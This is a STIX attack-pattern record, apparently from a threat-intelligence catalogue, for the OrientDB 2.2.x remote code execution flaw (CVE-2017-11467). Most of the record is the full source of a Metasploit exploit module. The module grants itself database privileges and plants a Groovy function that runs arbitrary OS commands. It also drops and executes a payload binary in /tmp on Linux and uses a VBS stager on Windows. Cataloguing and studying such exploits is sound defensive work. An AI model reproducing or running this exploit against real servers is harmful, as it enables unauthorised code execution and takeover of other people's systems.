{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--895f9029-51a3-471d-8232-7148519cccb7",
    "created": "2024-08-14T17:08:20.370492Z",
    "modified": "2024-08-14T17:08:20.370496Z",
    "name": "OrientDB 2.2.x Remote Code Execution",
    "description": " This module leverages a privilege escalation on OrientDB to execute unsandboxed OS commands. All versions from 2.2.2 up to 2.2.22 should be vulnerable. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/orientdb_exec.rb",
            "external_id": "orientdb_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-11467"
        },
        {
            "source_name": "reference",
            "url": "https://blogs.securiteam.com/index.php/archives/3318"
        },
        {
            "source_name": "reference",
            "url": "http://www.palada.net/index.php/2017/07/13/news-2112/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/orientechnologies/orientdb/wiki/OrientDB-2.2-Release-Notes#2223---july-11-2017"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'OrientDB 2.2.x Remote Code Execution',\n      'Description'    => %q{\n          This module leverages a privilege escalation on OrientDB to execute unsandboxed OS commands.\n          All versions from 2.2.2 up to 2.2.22 should be vulnerable.\n      },\n      'Author'  =>\n        [\n          'Francis Alexander - Beyond Security\\'s SecuriTeam Secure Disclosure program', # Public PoC\n          'Ricardo Jorge Borges de Almeida ricardojba1[at]gmail.com', # Metasploit Module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2017-11467'],\n          ['URL', 'https://blogs.securiteam.com/index.php/archives/3318'],\n          ['URL', 'http://www.palada.net/index.php/2017/07/13/news-2112/'],\n          ['URL', 'https://github.com/orientechnologies/orientdb/wiki/OrientDB-2.2-Release-Notes#2223---july-11-2017']\n        ],\n      'Platform'  => %w{ linux unix win },\n      'Privileged'  => false,\n      'Targets'   =>\n        [\n          ['Linux',    {'Arch' => ARCH_X86, 'Platform' => 'linux' }],\n          ['Unix CMD', {'Arch' => ARCH_CMD, 'Platform' => 'unix', 'Payload' => {'BadChars' => \"\\x22\"}}],\n          ['Windows',  {'Arch' => ARCH_X86, 'Platform' => 'win', 'CmdStagerFlavor' => ['vbs','certutil']}]\n        ],\n      'DisclosureDate' => '2017-07-13',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        Opt::RPORT(2480),\n        OptString.new('USERNAME', [ true,  'HTTP Basic Auth User', 'writer' ]),\n        OptString.new('PASSWORD', [ true,  'HTTP Basic Auth Password', 'writer' ]),\n        OptString.new('TARGETURI', [ true,  'The path to the OrientDB application', '/' ])\n      ])\n\n    self.needs_cleanup = true\n  end\n\n  def check\n    uri = target_uri\n    uri.path = normalize_uri(uri.path)\n    res = send_request_raw({'uri' => \"#{uri.path}listDatabases\"})\n    if res and res.code == 200 and res.headers['Server'] =~ /OrientDB Server v\\.2\\.2\\./\n      print_good(\"Version: #{res.headers['Server']}\")\n      return Exploit::CheckCode::Vulnerable\n    else\n      print_status(\"Version: #{res.headers['Server']}\")\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n  def http_send_command(cmd, opts = {})\n    # 1 -Create the malicious function\n    func_name = Rex::Text::rand_text_alpha(5).downcase\n    request_parameters = {\n      'method'    => 'POST',\n      'uri'       => normalize_uri(@uri.path, \"/document/#{opts}/-1:-1\"),\n      'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),\n      'headers' => { 'Accept' => '*/*', 'Content-Type' => 'application/json;charset=UTF-8' },\n      'data' => \"{\\\"@class\\\":\\\"ofunction\\\",\\\"@version\\\":0,\\\"@rid\\\":\\\"#-1:-1\\\",\\\"idempotent\\\":null,\\\"name\\\":\\\"#{func_name}\\\",\\\"language\\\":\\\"groovy\\\",\\\"code\\\":\\\"#{java_craft_runtime_exec(cmd)}\\\",\\\"parameters\\\":null}\"\n    }\n    res = send_request_raw(request_parameters)\n    if not (res and res.code == 201)\n      begin\n        json_body = JSON.parse(res.body)\n      rescue JSON::ParserError\n        fail_with(Failure::Unknown, 'Failed to create the malicious function.')\n        return\n      end\n    end\n    # 2 - Trigger the malicious function\n    request_parameters = {\n      'method'    => 'POST',\n      'uri'       => normalize_uri(@uri.path, \"/function/#{opts}/#{func_name}\"),\n      'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),\n      'headers' => { 'Accept' => '*/*', 'Content-Type' => 'application/json;charset=UTF-8' },\n      'data' => \"\"\n    }\n    req = send_request_raw(request_parameters)\n    if not (req and req.code == 200)\n      begin\n        json_body = JSON.parse(res.body)\n      rescue JSON::ParserError\n        fail_with(Failure::Unknown, 'Failed to trigger the malicious function.')\n        return\n      end\n    end\n    # 3 - Get the malicious function id\n    if res && res.body.length > 0\n      begin\n        json_body = JSON.parse(res.body)[\"@rid\"]\n      rescue JSON::ParserError\n        fail_with(Failure::Unknown, 'Failed to obtain the malicious function id for deletion.')\n        return\n      end\n    end\n    func_id = json_body.slice(1..-1)\n    # 4 - Delete the malicious function\n    request_parameters = {\n      'method'    => 'DELETE',\n      'uri'       => normalize_uri(@uri.path, \"/document/#{opts}/#{func_id}\"),\n      'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),\n      'headers' => { 'Accept' => '*/*' },\n      'data' => \"\"\n    }\n    rer = send_request_raw(request_parameters)\n    if not (rer and rer.code == 204)\n      begin\n        json_body = JSON.parse(res.body)\n      rescue JSON::ParserError\n        fail_with(Failure::Unknown, 'Failed to delete the malicious function.')\n        return\n      end\n    end\n  end\n\n  def java_craft_runtime_exec(cmd)\n    decoder = Rex::Text.rand_text_alpha(5, 8)\n    decoded_bytes = Rex::Text.rand_text_alpha(5, 8)\n    cmd_array = Rex::Text.rand_text_alpha(5, 8)\n    jcode =  \"sun.misc.BASE64Decoder #{decoder} = new sun.misc.BASE64Decoder();\\n\"\n    jcode << \"byte[] #{decoded_bytes} = #{decoder}.decodeBuffer(\\\"#{Rex::Text.encode_base64(cmd)}\\\");\\n\"\n    jcode << \"String [] #{cmd_array} = new String[3];\\n\"\n    if target['Platform'] == 'win'\n      jcode << \"#{cmd_array}[0] = \\\"cmd.exe\\\";\\n\"\n      jcode << \"#{cmd_array}[1] = \\\"/c\\\";\\n\"\n    else\n      jcode << \"#{cmd_array}[0] = \\\"/bin/sh\\\";\\n\"\n      jcode << \"#{cmd_array}[1] = \\\"-c\\\";\\n\"\n    end\n    jcode << \"#{cmd_array}[2] = new String(#{decoded_bytes}, \\\"UTF-8\\\");\\n\"\n    jcode << \"Runtime.getRuntime().exec(#{cmd_array});\\n\"\n    jcode\n  end\n\n  def on_new_session(client)\n    if not @to_delete.nil?\n      print_warning(\"Deleting #{@to_delete} payload file\")\n      execute_command(\"rm #{@to_delete}\")\n    end\n  end\n\n  def execute_command(cmd, opts = {})\n    vprint_status(\"Attempting to execute: #{cmd}\")\n    @uri = target_uri\n    @uri.path = normalize_uri(@uri.path)\n    res = send_request_raw({'uri' => \"#{@uri.path}listDatabases\"})\n    if res && res.code == 200 && res.body.length > 0\n      begin\n        json_body = JSON.parse(res.body)[\"databases\"]\n      rescue JSON::ParserError\n        print_error(\"Unable to parse JSON\")\n        return\n      end\n    else\n      print_error(\"Timeout or unexpected response...\")\n      return\n    end\n    targetdb = json_body[0]\n    http_send_command(cmd,targetdb)\n  end\n\n  def linux_stager\n    cmds = \"echo LINE | tee FILE\"\n    exe = Msf::Util::EXE.to_linux_x86_elf(framework, payload.raw)\n    base64 = Rex::Text.encode_base64(exe)\n    base64.gsub!(/\\=/, \"\\\\u003d\")\n    file = rand_text_alphanumeric(4+rand(4))\n    execute_command(\"touch /tmp/#{file}.b64\")\n    cmds.gsub!(/FILE/, \"/tmp/\" + file + \".b64\")\n    base64.each_line do |line|\n      line.chomp!\n      cmd = cmds\n      cmd.gsub!(/LINE/, line)\n      execute_command(cmds)\n    end\n    execute_command(\"base64 -d /tmp/#{file}.b64|tee /tmp/#{file}\")\n    execute_command(\"chmod +x /tmp/#{file}\")\n    execute_command(\"rm /tmp/#{file}.b64\")\n    execute_command(\"/tmp/#{file}\")\n    @to_delete = \"/tmp/#{file}\"\n  end\n\n  def exploit\n    @uri = target_uri\n    @uri.path = normalize_uri(@uri.path)\n    res = send_request_raw({'uri' => \"#{@uri.path}listDatabases\"})\n    if res && res.code == 200 && res.body.length > 0\n      begin\n        json_body = JSON.parse(res.body)[\"databases\"]\n      rescue JSON::ParserError\n        print_error(\"Unable to parse JSON\")\n        return\n      end\n    else\n      print_error(\"Timeout or unexpected response...\")\n      return\n    end\n    targetdb = json_body[0]\n    privs_enable = ['create','read','update','execute','delete']\n    items = ['database.class.ouser','database.function','database.systemclusters']\n    # Set the required DB permissions\n    privs_enable.each do |priv|\n      items.each do |item|\n       request_parameters = {\n        'method'    => 'POST',\n        'uri'       => normalize_uri(@uri.path, \"/command/#{targetdb}/sql/-/20\"),\n        'vars_get' => { 'format' => 'rid,type,version,class,graph' },\n        'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),\n        'headers' => { 'Accept' => '*/*' },\n        'data' => \"GRANT #{priv} ON #{item} TO writer\"\n       }\n       res = send_request_raw(request_parameters)\n      end\n    end\n    # Exploit\n    case target['Platform']\n    when 'win'\n      print_status(\"#{rhost}:#{rport} - Sending command stager...\")\n      execute_cmdstager(flavor: :vbs)\n    when 'unix'\n      print_status(\"#{rhost}:#{rport} - Sending payload...\")\n      res = http_send_command(\"#{payload.encoded}\",\"#{targetdb}\")\n    when 'linux'\n      print_status(\"#{rhost}:#{rport} - Sending Linux stager...\")\n      linux_stager\n    end\n    handler\n    # Final Cleanup\n    privs_enable.each do |priv|\n      items.each do |item|\n       request_parameters = {\n        'method'    => 'POST',\n        'uri'       => normalize_uri(@uri.path, \"/command/#{targetdb}/sql/-/20\"),\n        'vars_get' => { 'format' => 'rid,type,version,class,graph' },\n        'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),\n        'headers' => { 'Accept' => '*/*' },\n        'data' => \"REVOKE #{priv} ON #{item} FROM writer\"\n       }\n       res = send_request_raw(request_parameters)\n      end\n    end\n   end\nend\n\n",
    "x_mitre_disclosure_date": "2017-07-13",
    "x_mitre_platforms": [
        "%w{ linux unix win }"
    ]
}